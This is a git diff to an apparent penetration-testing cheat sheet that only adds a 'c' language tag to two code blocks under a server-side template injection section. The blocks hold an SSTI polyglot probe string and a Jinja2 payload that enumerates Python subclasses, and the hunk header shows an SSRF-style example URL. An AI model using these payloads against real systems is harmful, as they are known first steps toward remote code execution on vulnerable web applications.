@@ -1749,13 +1749,17 @@ https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
 
 > https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
 
-```$\{\{<%[%'"}}%\.```
+```c
+$\{\{<%[%'"}}%\.
+```
 
 ##### Magic Payload
 
 > https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
 
-```\{\{ ‘’.__class__.__mro__[1].__subclasses__() }}```
+```c
+\{\{ ‘’.__class__.__mro__[1].__subclasses__() }}
+```
 
 #### Upload Vulnerabilities
 
